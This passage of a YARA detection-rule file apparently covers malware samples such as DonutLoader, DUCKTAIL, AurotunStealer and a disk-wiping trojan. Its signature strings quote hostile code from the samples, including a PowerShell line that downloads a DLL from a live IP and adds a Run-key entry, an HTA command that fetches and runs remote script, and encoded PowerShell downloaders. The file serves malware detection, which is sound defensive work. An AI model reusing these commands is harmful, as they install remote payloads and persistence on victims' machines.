      $s4 = "TUR3c2ZXZXhsUkdDcFhoRk91emR3bmUzVWRyRHl1NXo=" fullword wide /* base64 encoded string 'MDwsfWexlRGCpXhFOuzdwne3UdrDyu5z' */ /* score: '14.00'*/
      $s5 = "    <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s6 = "get_ActivatePong" fullword ascii /* score: '9.00'*/
      $s7 = "Pastebin" fullword wide /* score: '9.00'*/
      $s8 = "EyenmYXaFXaE" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule DiskWriter_signature__22f56d31ff394b32c4d9d9354ca982ca_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_22f56d31ff394b32c4d9d9354ca982ca(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6c7b2d80e2025dff27e5b35f5971e566cc5e77bf285492a52c2996829ee75b3d"
   strings:
      $x1 = "C:\\Users\\HP Pavilion\\source\\repos\\N17Pro3426\\Release\\N17Pro3426.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "/f /im explorer.exe" fullword ascii /* score: '23.00'*/
      $s3 = "Warning! You have ran a trojan known as u89ht7ig53 that has full capacity to delete all of your data and your operating system. " wide /* score: '16.00'*/
      $s4 = "taskkill" fullword ascii /* score: '12.00'*/
      $s5 = "        <requestedExecutionLevel level='requireAdministrator' uiAccess='false' />" fullword ascii /* score: '11.00'*/
      $s6 = "Congratulations! u89ht7ig53 has infected your PC! Now try to close this window!" fullword wide /* score: '9.00'*/
      $s7 = "Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator wi" wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and all of them
}

rule c39e7dbafb82a85f33e2bdd2e489f77f_imphash_ {
   meta:
      description = "_subset_batch - file c39e7dbafb82a85f33e2bdd2e489f77f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e7657c2d0adeca459c2731cdab7b8bfab38483670e5e2f490184541745486cba"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $x2 = "\\??\\C:\\Windows\\TEMP\\lsass.exe" fullword ascii /* score: '33.00'*/
      $s3 = "C:\\Windows\\System32\\notepad.exe" fullword ascii /* score: '29.00'*/
      $s4 = "C:\\Windows\\TEMP\\gianni2.exe" fullword ascii /* score: '28.00'*/
      $s5 = "C:\\Windows\\TEMP\\gianni4.exe" fullword ascii /* score: '28.00'*/
      $s6 = "C:\\Windows\\TEMP\\gianni1.exe" fullword ascii /* score: '28.00'*/
      $s7 = "C:\\Windows\\TEMP\\finalStage.exe" fullword ascii /* score: '28.00'*/
      $s8 = "C:\\Windows\\TEMP\\gianni0.exe" fullword ascii /* score: '28.00'*/
      $s9 = "C:\\Windows\\TEMP\\gianni3.exe" fullword ascii /* score: '28.00'*/
      $s10 = "\\??\\C:\\Windows\\System32\\calc.exe" fullword wide /* score: '26.00'*/
      $s11 = "Win32_Process" fullword ascii /* score: '15.00'*/
      $s12 = "\\REGISTRY\\MACHINE\\SYSTEM\\DriverDatabase\\" fullword ascii /* score: '11.00'*/
      $s13 = "LoadKey failed." fullword ascii /* score: '10.00'*/
      $s14 = "Base64 decode failed." fullword ascii /* score: '9.00'*/
      $s15 = "aaahwhhsh" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule cd4dc40e6b31a595a5d908a2ea76bd71e792b15b56f8e00935bd4dc6a389d91b_cd4dc40e {
   meta:
      description = "_subset_batch - file cd4dc40e6b31a595a5d908a2ea76bd71e792b15b56f8e00935bd4dc6a389d91b_cd4dc40e.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cd4dc40e6b31a595a5d908a2ea76bd71e792b15b56f8e00935bd4dc6a389d91b"
   strings:
      $s1 = " _0x5173ea(-a0_0x198c05._0x34ac33, -0x20), _0x4454f8 = GetObject('\\x77\\x69\\x6e\\x6d' + _0x5173ea(-0x216, -a0_0x198c05._0x5246" ascii /* score: '17.00'*/
      $s2 = "f5(0x75, -0xb6) + _0x1568f5(0x30c, a0_0x5a3e95._0x267a74) && (_0x1689ba += '\\x2d\\x20' + _0x4bdae3[_0x1568f5(0x1cf, 0x208)] + '" ascii /* score: '15.00'*/
      $s3 = "73d2 != 0x40 && (_0x5d71fe = _0x5d71fe + String['\\x66\\x72\\x6f\\x6d' + _0x55307b(0xb, -0x6) + _0x55307b(0x294, a0_0x2ab8b4._0x" ascii /* score: '15.00'*/
      $s4 = "b0)](_0x22e99c)), _0x3d0ae2 != 0x40 && (_0x5d71fe = _0x5d71fe + String[_0x55307b(-0x17, 0x10e) + _0x55307b(0x119, -0x6) + '\\x43" ascii /* score: '15.00'*/
      $s5 = "1(0x2a5, 0x479) + _0x4d4521(-0x18, -0x214) + '\\x3d' + encodeURIComponent(_0x38b90b);" fullword ascii /* score: '15.00'*/
      $s6 = "(a0_0x382fff._0x2f9265, -0x19) + '\\x41\\x74'](_0x750ad1 >>> 0x4 & 0xf) + _0x2fc2f7[_0x438c5f(-0xa5, -0x19) + '\\x41\\x74'](0xf " ascii /* score: '14.00'*/
      $s7 = "\\x69\\x6e\\x64\\x65' + _0x559c47(-0x49, a0_0x2a42ad._0x5accd4)](_0x1938f8[_0x559c47(-0x10f, -a0_0x2a42ad._0x4e6ebd) + '\\x41\\x" ascii /* score: '13.00'*/
      $s8 = "_0x731062[_0xe6f328(a0_0xd8230a._0x345377, a0_0xd8230a._0x38abfa) + _0xe6f328(a0_0xd8230a._0x4324df, -0x3) + _0xe6f328(0x308, a0" ascii /* score: '12.00'*/
      $s9 = "1, -0x27) + _0x55307b(0x136, 0x257)](_0x2bbcd1) !== -0x1;" fullword ascii /* score: '12.00'*/
      $s10 = "dac, _0x4c2197, _0x28ce9e[_0x1869b7 + 0xd], 0x5, -0x561c16fb), _0x20d507, _0x25adac, _0x4434bf[_0x1869b7 + 0x2], 0x9, -0x3105c08" ascii /* score: '12.00'*/
      $s11 = "2579)), _0x3bb1e3 != 0x40 && (_0x457c63 = _0x457c63 + _0x52ebf9['\\x66\\x72\\x6f\\x6d' + _0x559c47(-a0_0x2a42ad._0x49fa54, -a0_0" ascii /* score: '12.00'*/
      $s12 = "0xe7f58e + 0x0], 0x6, -0xbd6ddbc), _0x2086e2, _0xc3271a, _0x87e69b[_0xe7f58e + 0x7], 0xa, 0x432aff97), _0x2f17e2, _0x2086e2, _0x" ascii /* score: '12.00'*/
      $s13 = "a0_0xeee7ba._0x385f3a, -0x52) + _0x50c966(-a0_0xeee7ba._0x39ccfc, -a0_0xeee7ba._0x2df7f0) + _0x50c966(-a0_0xeee7ba._0x21320e, -a" ascii /* score: '12.00'*/
      $s14 = "52adb1._0x21f945, a0_0x52adb1._0x59cdeb)) / 0x2 + parseInt(_0x3d802e(-0xfa, -a0_0x52adb1._0x7094a8)) / 0x3 * (parseInt(_0x3d802e" ascii /* score: '12.00'*/
      $s15 = "}(a0_0x3639, 0x7a995), document[a0_0x51b818(0x152, 0x1df) + '\\x65'](a0_0x51b818(0x19a, 0x97) + (a0_0x51b818(0x158, -0x44) + '" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 1000KB and
      8 of them
}

rule d059f7d6f6771b71b26ca503547a8f19105d0fdb859d91143c411114dde6fac4_d059f7d6 {
   meta:
      description = "_subset_batch - file d059f7d6f6771b71b26ca503547a8f19105d0fdb859d91143c411114dde6fac4_d059f7d6.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d059f7d6f6771b71b26ca503547a8f19105d0fdb859d91143c411114dde6fac4"
   strings:
      $s1 = " (_0xe78e04(0x7a, -0x9e) + _0xe78e04(a0_0x32f183._0x515f9b, a0_0x32f183._0x1c03ab)) + encodeURIComponent(_0x231011) + '\\x26\\x6" ascii /* score: '15.00'*/
      $s2 = "bc20 = GetObject(_0x41c051(a0_0x13c013._0x4b6732, a0_0x13c013._0x138a1d) + '\\x6d\\x74\\x73\\x3a\\x5c' + _0x41c051(-a0_0x13c013." ascii /* score: '13.00'*/
      $s3 = "0c3, _0x22f3fa, _0x43ec01, _0x56cfcc, _0x21675e[_0x3716b8 + 0x4], 0x7, -0xa83f051), _0x22f3fa, _0x43ec01, _0x21675e[_0x3716b8 + " ascii /* score: '12.00'*/
      $s4 = "_0x21675e[_0x3716b8 + 0xa], 0xf, -0x100b83), _0x56cfcc, _0x18a0c3, _0x21675e[_0x3716b8 + 0x1], 0x15, -0x7a7ba22f), _0x43ec01 = a" ascii /* score: '12.00'*/
      $s5 = "adc, -0x5c) + _0x66df5f(a0_0x5304b7._0x33fdcf, a0_0x5304b7._0x314c6d)]()) {" fullword ascii /* score: '12.00'*/
      $s6 = "e[_0x3716b8 + 0xb], 0x16, -0x76a32842), _0x43ec01 = a0_0x1428ac(_0x43ec01, _0x56cfcc = a0_0x1428ac(_0x56cfcc, _0x18a0c3 = a0_0x1" ascii /* score: '12.00'*/
      $s7 = ")), _0x268f2a = new ActiveXObject(_0x1428fe(0x44a, 0x5b4) + _0x1428fe(0x190, -a0_0x53dc56._0x27943c) + _0x1428fe(0x34b, a0_0x53d" ascii /* score: '12.00'*/
      $s8 = "3306, a0_0x5304b7._0x79bf0e) + _0x66df5f(0x475, a0_0x5304b7._0x7cead9) + _0x66df5f(a0_0x5304b7._0x4d4654, -a0_0x5304b7._0x35d0c0" ascii /* score: '12.00'*/
      $s9 = "8a0c3 = a0_0x20dd2c(_0x18a0c3, _0x22f3fa, _0x43ec01, _0x56cfcc, _0x21675e[_0x3716b8 + 0x5], 0x5, -0x29d0efa3), _0x22f3fa, _0x43e" ascii /* score: '12.00'*/
      $s10 = "2f3fa, _0x43ec01, _0x56cfcc, _0x21675e[_0x3716b8 + 0x0], 0x7, -0x28955b88), _0x22f3fa, _0x43ec01, _0x21675e[_0x3716b8 + 0x1], 0x" ascii /* score: '12.00'*/
      $s11 = "9), _0x56cfcc, _0x18a0c3, _0x21675e[_0x3716b8 + 0xc], 0x14, -0x72d5b376), _0x43ec01 = a0_0x47504f(_0x43ec01, _0x56cfcc = a0_0x47" ascii /* score: '12.00'*/
      $s12 = "21675e[_0x3716b8 + 0x6], 0x9, -0x3fbf4cc0), _0x18a0c3, _0x22f3fa, _0x21675e[_0x3716b8 + 0xb], 0xe, 0x265e5a51), _0x56cfcc, _0x18" ascii /* score: '12.00'*/
      $s13 = "+ 0x3], 0x16, -0x3e423112), _0x43ec01 = a0_0x1428ac(_0x43ec01, _0x56cfcc = a0_0x1428ac(_0x56cfcc, _0x18a0c3 = a0_0x1428ac(_0x18a" ascii /* score: '12.00'*/
      $s14 = "5e[_0x3716b8 + 0xe], 0xf, -0x546bdc59), _0x56cfcc, _0x18a0c3, _0x21675e[_0x3716b8 + 0x5], 0x15, -0x36c5fc7), _0x43ec01 = a0_0x30" ascii /* score: '12.00'*/
      $s15 = "3fa, _0x21675e[_0x3716b8 + 0x6], 0xf, -0x5cfebcec), _0x56cfcc, _0x18a0c3, _0x21675e[_0x3716b8 + 0xd], 0x15, 0x4e0811a1), _0x43ec" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 1000KB and
      8 of them
}

rule d9b02edead83f5f534ac9b340061e0187e1384f3b977592c6868d89f136bf1e0_d9b02ede {
   meta:
      description = "_subset_batch - file d9b02edead83f5f534ac9b340061e0187e1384f3b977592c6868d89f136bf1e0_d9b02ede.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d9b02edead83f5f534ac9b340061e0187e1384f3b977592c6868d89f136bf1e0"
   strings:
      $s1 = "* (-parseInt(_0x4fa8a7(0x2fd, a0_0x22baa2._0x4bbe66)) / 0x6) + parseInt(_0x4fa8a7(-a0_0x22baa2._0x2a749a, 0x59)) / 0x7 + -parseI" ascii /* score: '16.00'*/
      $s2 = "\\x68\\x65\\x6e' + _0x42e31b(-a0_0x36e63a._0x14f881, -0x134)] = !![], _0x3aefa8[_0x42e31b(-a0_0x36e63a._0x565567, -0x83) + _0x42" ascii /* score: '13.00'*/
      $s3 = "7d32(a0_0xaaf93d._0x2cfe90, 0x578)](_0x4097ee >>> 0x4 & 0xf) + _0x1357e2['\\x63\\x68\\x61\\x72\\x41\\x74'](0xf & _0x4097ee);" fullword ascii /* score: '13.00'*/
      $s4 = "151)] = 0x3, _0x3aefa8[_0x42e31b(-0x3a4, -0x1dd) + _0x42e31b(-a0_0x36e63a._0x50dfdd, -a0_0x36e63a._0x5376f4) + _0x42e31b(-a0_0x3" ascii /* score: '12.00'*/
      $s5 = "7, -a0_0x3f628a._0x15b272) + _0x44dc3f(a0_0x3f628a._0x2880de, a0_0x3f628a._0x2c5c7e)), _0x54de10 = new Enumerator(_0x244090[_0x4" ascii /* score: '12.00'*/
      $s6 = "6e63a._0x2cb2a8, -0x7b)] = ![], _0x3aefa8[_0x42e31b(0x1ee, 0xee) + _0x42e31b(-a0_0x36e63a._0x20fa87, a0_0x36e63a._0x357e85) + _0" ascii /* score: '12.00'*/
      $s7 = "9, _0x5ee713[_0x30c100 + 0x4], 0x6, -0x8ac817e), _0x26cc5e, _0x180831, _0x4abbab[_0x3dcba4 + 0xb], 0xa, -0x42c50dcb), _0x260030," ascii /* score: '12.00'*/
      $s8 = "+ 0x9], 0x4, -0x262b2fc7), _0xdadf90, _0x39ad1c, _0x3a4f8f[_0x5ecc1f + 0xc], 0xb, -0x1924661b), _0x3546fe, _0xdadf90, _0x3a4f8f[" ascii /* score: '12.00'*/
      $s9 = "x3546fe, _0xdadf90, _0x39ad1c, _0x2fea28, _0x3a4f8f[_0x5ecc1f + 0x4], 0x7, -0xa83f051), _0xdadf90, _0x39ad1c, _0x3a4f8f[_0x5ecc1" ascii /* score: '12.00'*/
      $s10 = ")]('\\x2e')[0x0] + (_0x91a900(-a0_0x4cb994._0x454a8e, -a0_0x4cb994._0x13aafc) + _0x91a900(a0_0x4cb994._0x43a783, 0x1f8)) + _0x27" ascii /* score: '12.00'*/
      $s11 = "                    return _0x3face9 << _0x389567 | _0x12ae24 >>> 0x20 - _0x333313;" fullword ascii /* score: '12.00'*/
      $s12 = "_0xdadf90, _0x39ad1c, _0x2fea28, _0x3a4f8f[_0x5ecc1f + 0x0], 0x7, -0x28955b88), _0xdadf90, _0x39ad1c, _0x3a4f8f[_0x5ecc1f + 0x1]" ascii /* score: '12.00'*/
      $s13 = "4f8f[_0x5ecc1f + 0xc], 0x6, 0x655b59c3), _0xdadf90, _0x39ad1c, _0x3a4f8f[_0x5ecc1f + 0x3], 0xa, -0x70f3336e), _0x3546fe, _0xdadf" ascii /* score: '12.00'*/
      $s14 = " _0x3a4f8f[_0x5ecc1f + 0x8], 0x6, 0x6fa87e4f), _0xdadf90, _0x39ad1c, _0x3a4f8f[_0x5ecc1f + 0xf], 0xa, -0x1d31920), _0x3546fe, _0" ascii /* score: '12.00'*/
      $s15 = "e(_0x2fea28, _0x3546fe = a0_0x62ad5e(_0x3546fe, _0xdadf90, _0x39ad1c, _0x2fea28, _0x3a4f8f[_0x5ecc1f + 0xd], 0x5, -0x561c16fb), " ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 1000KB and
      8 of them
}

rule DarkCloud_signature_ {
   meta:
      description = "_subset_batch - file DarkCloud(signature).hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f3812c858b1ec1036c4e8a74bc2b1d58dbb9b56059fa77d1e633c6151f155407"
   strings:
      $s1 = "     *  Mode Of Operation - Electonic Codebook (ECB)" fullword ascii /* score: '14.00'*/
      $s2 = "     *  Mode Of Operation - Counter (CTR)" fullword ascii /* score: '14.00'*/
      $s3 = "     *  Counter object for CTR common mode of operation" fullword ascii /* score: '13.00'*/
      $s4 = "     *  Mode Of Operation - Output Feedback (OFB)" fullword ascii /* score: '12.00'*/
      $s5 = "     *  Mode Of Operation - Cipher Feedback (CFB)" fullword ascii /* score: '12.00'*/
      $s6 = "            copyBuffer(encrypted, this._shiftRegister, 16 - this.segmentSize, i, i + this.segmentSize);" fullword ascii /* score: '12.00'*/
      $s7 = "     *  Mode Of Operation - Cipher Block Chaining (CBC)" fullword ascii /* score: '12.00'*/
      $s8 = "    ModeOfOperationCTR.prototype.decrypt = ModeOfOperationCTR.prototype.encrypt;" fullword ascii /* score: '11.00'*/
      $s9 = "    ModeOfOperationOFB.prototype.decrypt = ModeOfOperationOFB.prototype.encrypt;" fullword ascii /* score: '11.00'*/
      $s10 = "                targetBuffer[targetStart++] = sourceBuffer[i];" fullword ascii /* score: '9.00'*/
      $s11 = "    ModeOfOperationCFB.prototype.encrypt = function(plainpolygonate) {" fullword ascii /* score: '9.00'*/
      $s12 = "    ModeOfOperationOFB.prototype.encrypt = function(plainpolygonate) {" fullword ascii /* score: '9.00'*/
      $s13 = "            sourceBuffer.copy(targetBuffer, targetStart, sourceStart, sourceEnd);" fullword ascii /* score: '9.00'*/
      $s14 = "    ModeOfOperationCBC.prototype.encrypt = function(plainpolygonate) {" fullword ascii /* score: '9.00'*/
      $s15 = "    ModeOfOperationCTR.prototype.encrypt = function(plainpolygonate) {" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 300KB and
      8 of them
}

rule c31f712435c1319460fffaf0de7d3698619e0f136f705688c7449a66b31b5426_c31f7124 {
   meta:
      description = "_subset_batch - file c31f712435c1319460fffaf0de7d3698619e0f136f705688c7449a66b31b5426_c31f7124.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c31f712435c1319460fffaf0de7d3698619e0f136f705688c7449a66b31b5426"
   strings:
      $s1 = ") + _0x4c9739(-a0_0x253e1d._0x44fe81, -a0_0x253e1d._0xedb25c)](_0x21f015 >>> 0x4 & 0xf) + _0x15dd5b[_0x4c9739(-a0_0x253e1d._0x43" ascii /* score: '17.00'*/
      $s2 = "14d5._0x103a09, -a0_0x3d14d5._0xece234) + '\\x30\\x4d', _0x116a69 && (_0x27d907[_0x113c93(0x2aa, a0_0x3d14d5._0x3c75eb) + '\\x6e" ascii /* score: '15.00'*/
      $s3 = "279 = GetObject(_0x2c8ca7(-a0_0x215425._0x18ba28, -a0_0x215425._0x56e996) + _0x2c8ca7(-0x19d, -a0_0x215425._0x5f5a41) + _0x2c8ca" ascii /* score: '13.00'*/
      $s4 = "\\x4d\\x53\\x53' + '\\x63\\x72\\x69' + _0x37978e(0x56, -0x5f) + _0x37978e(0x80, a0_0xa5f158._0x3acbee) + '\\x72\\x6f\\x6c' + '" ascii /* score: '13.00'*/
      $s5 = "x19ab05, -0x97) + '\\x6d\\x65\\x3a' + '\\x20' + _0x4dcef7 + '\\x0a';" fullword ascii /* score: '12.00'*/
      $s6 = "077a5._0xebb2dc, -0x47) + _0x268000(a0_0x3077a5._0x394e11, 0xa9) + _0x268000(-0xba, 0xba) + _0x268000(0x54, a0_0x3077a5._0xaa7bc" ascii /* score: '12.00'*/
      $s7 = "+ -parseInt(_0x35fe70(0x51f, a0_0x54c7a4._0x505aa5)) / 0x6 + parseInt(_0x35fe70(0x535, 0x424)) / 0x7 * (parseInt(_0x35fe70(a0_0x" ascii /* score: '12.00'*/
      $s8 = "tiveXObject(_0x1f4f80(0x54, -a0_0x50d719._0x5a6ad4) + _0x1f4f80(a0_0x50d719._0x11ab9b, -a0_0x50d719._0x76b81a) + '\\x69\\x6e\\x6" ascii /* score: '12.00'*/
      $s9 = "0x323d2b._0x2dbfcd) + '\\x54', _0x237662, ![]), _0x3b9729[_0x327c0d(-a0_0x323d2b._0x4ba41c, -a0_0x323d2b._0x76e527) + '\\x64'](a" ascii /* score: '12.00'*/
      $s10 = ", -a0_0x4dabb1._0x46a3da) + '\\x64\\x65\\x72' + '\\x73']);" fullword ascii /* score: '12.00'*/
      $s11 = "Object('\\x57\\x53\\x63' + _0x48795a(a0_0x152898._0x310233, 0x2c4) + _0x48795a(a0_0x152898._0x5be03f, -0x88) + _0x48795a(0x284, " ascii /* score: '12.00'*/
      $s12 = "        _0x21f015 = _0x3034eb[_0x4c9739(-0x16f, 0x32) + _0x4c9739(a0_0x253e1d._0x85970, a0_0x253e1d._0x2b2047) + _0x4c9739(-a0_0" ascii /* score: '12.00'*/
      $s13 = "3b8cb2, -0x6b) + _0x5c1f0b(a0_0x247f52._0x5bf723, a0_0x247f52._0x224a6a) + _0x5c1f0b(a0_0x247f52._0x5c9ba0, -0x5b)](_0xbae43 + 0" ascii /* score: '12.00'*/
      $s14 = ", -a0_0x1fae6e._0x1eeeb4) + _0x5ae6e6(-0x242, -0x1bc) + _0x5ae6e6(0x1b, -a0_0x1fae6e._0x419a93) + _0x5ae6e6(-0x18d, -0x3a) + '" ascii /* score: '12.00'*/
      $s15 = "8, -a0_0x4dabb1._0x46a3da) + _0x376d95(-a0_0x4dabb1._0x294d86, -a0_0x4dabb1._0x5b54e0)](_0x3166b6), _0x12c8d2 = new Enumerator(_" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 800KB and
      8 of them
}

rule c56d9562ed3f600e128961cfc07e43209017a8c7ae3a8205600acf6f4acd5e13_c56d9562 {
   meta:
      description = "_subset_batch - file c56d9562ed3f600e128961cfc07e43209017a8c7ae3a8205600acf6f4acd5e13_c56d9562.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c56d9562ed3f600e128961cfc07e43209017a8c7ae3a8205600acf6f4acd5e13"
   strings:
      $s1 = "$source = \"C:\\Windows\\System32\\auditpol.exe\"" fullword ascii /* score: '25.00'*/
      $s2 = "$dllUrl = \"http://128.140.70.83:8080/panamera.dll\"" fullword ascii /* score: '24.00'*/
      $s3 = "$dllDestination = \"$env:LOCALAPPDATA\\Microsoft\\auditpolcore.dll\"" fullword ascii /* score: '22.00'*/
      $s4 = "$destination2 = \"$env:LOCALAPPDATA\\Microsoft\\auditpoll.exe\"" fullword ascii /* score: '17.00'*/
      $s5 = "$destination1 = \"$env:LOCALAPPDATA\\Microsoft\\auditpol.exe\"" fullword ascii /* score: '17.00'*/
      $s6 = "$registryPath = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" fullword ascii /* score: '16.00'*/
      $s7 = "Set-ItemProperty -Path $registryPath -Name $name -Value $value -Type String" fullword ascii /* score: '15.00'*/
      $s8 = "    Start-Process -FilePath $destination1" fullword ascii /* score: '14.00'*/
      $s9 = "        Invoke-WebRequest -Uri $dllUrl -OutFile $dllDestination" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7324 and filesize < 3KB and
      all of them
}

rule DonutLoader_signature_ {
   meta:
      description = "_subset_batch - file DonutLoader(signature).hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0b73dc0007ced207066fea7b4f297d10cc5a503fa2b2923950b6a5b5a78282a8"
   strings:
      $s1 = "      var cmd = 'powershell -w h -c \"iex (irm http://venavenl.com)\"';" fullword ascii /* score: '29.00'*/
      $s2 = "      shell.Exec(cmd);" fullword ascii /* score: '23.00'*/
      $s3 = "  </script>" fullword ascii /* score: '10.00'*/
      $s4 = "  <script language=\"JScript\">" fullword ascii /* score: '10.00'*/
      $s5 = "      var shell = new ActiveXObject(\"WScript.Shell\");" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 1KB and
      all of them
}

rule bcc9ed73dd3a72db6380a55cf2cee2696f4f57d848272bba8136f52f18d3f94a_bcc9ed73 {
   meta:
      description = "_subset_batch - file bcc9ed73dd3a72db6380a55cf2cee2696f4f57d848272bba8136f52f18d3f94a_bcc9ed73.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bcc9ed73dd3a72db6380a55cf2cee2696f4f57d848272bba8136f52f18d3f94a"
   strings:
      $s1 = "%SystemRoot%\\Installer\\{287B4A8E-7DD7-4AEE-8CEA-800960859AEC}\\Upgrade_Shortcut_5DC4D6A2E3DD4058A390BDBFF0EA7576.exe" fullword wide /* score: '27.00'*/
      $s2 = "UPGRAD~1.EXE" fullword ascii /* score: '19.00'*/
      $s3 = "Upgrade_Shortcut_5DC4D6A2E3DD4058A390BDBFF0EA7576.exe" fullword wide /* score: '19.00'*/
      $s4 = "..\\..\\..\\..\\..\\..\\..\\Windows\\Installer\\{287B4A8E-7DD7-4AEE-8CEA-800960859AEC}\\Upgrade_Shortcut_5DC4D6A2E3DD4058A390BDB" wide /* score: '16.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 8KB and
      all of them
}

rule AurotunStealer_signature_ {
   meta:
      description = "_subset_batch - file AurotunStealer(signature).lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9b4a00231389b2058ce3e411713304fc736c03ba412b290ec21a6aa2a213ee80"
   strings:
      $s1 = "powershell.exe" fullword ascii /* score: '27.00'*/
      $s2 = "?..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '20.00'*/
      $s3 = "-window min [Uri]::UnescapeDataString(('6375726c2e6578652027687474703a2f2f3138352e3132352e35302e32372f5465726d732e6d703427207c20" wide /* score: '16.00'*/
      $s4 = "%ProgramFiles%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '15.00'*/
      $s5 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 8KB and
      all of them
}

rule AurotunStealer_signature__b35387d0 {
   meta:
      description = "_subset_batch - file AurotunStealer(signature)_b35387d0.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b35387d0187ab84c977a565fe07f76abc142151dad003ae74b77758533b8da5f"
   strings:
      $s1 = "powershell.exe" fullword ascii /* score: '27.00'*/
      $s2 = "?..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '20.00'*/
      $s3 = "-window min [Uri]::UnescapeDataString(('6375726c2e6578652027687474703a2f2f3138352e3132352e35302e32372f5465726d732e6d703427207c20" wide /* score: '16.00'*/
      $s4 = "%ProgramFiles%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '15.00'*/
      $s5 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 8KB and
      all of them
}

rule DUCKTAIL_signature_ {
   meta:
      description = "_subset_batch - file DUCKTAIL(signature).lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "df8036c20a0a000fa247053c78142fa35f6fd7c77a5147ea7bf3f0e9eab66191"
   strings:
      $s1 = "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '29.00'*/
      $s2 = "-enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIgAgAC0AVwBpAG4AZAB" wide /* score: '28.00'*/
      $s3 = "powershell.exe" fullword ascii /* score: '27.00'*/
      $s4 = "E..\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '20.00'*/
      $s5 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 20KB and
      all of them
}

rule DUCKTAIL_signature__085b960e {
   meta:
      description = "_subset_batch - file DUCKTAIL(signature)_085b960e.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "085b960ea8e8a73aac2cd86c2b4d8d7bfea5fb69e50916c8b22036b28c1b9dc5"
   strings:
      $s1 = "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '29.00'*/
      $s2 = "-enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIgAgAC0AVwBpAG4AZAB" wide /* score: '28.00'*/
      $s3 = "powershell.exe" fullword ascii /* score: '27.00'*/
      $s4 = "E..\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '20.00'*/
      $s5 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 20KB and
      all of them
}

rule DUCKTAIL_signature__4c18e58c {
   meta:
      description = "_subset_batch - file DUCKTAIL(signature)_4c18e58c.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4c18e58c1d6a9840c32eebcc9ea3733cfb230a3b8d761348681221f94353bd00"
   strings:
      $s1 = "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '29.00'*/
      $s2 = "-enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIgAgAC0AVwBpAG4AZAB" wide /* score: '28.00'*/
      $s3 = "powershell.exe" fullword ascii /* score: '27.00'*/
      $s4 = "E..\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '20.00'*/
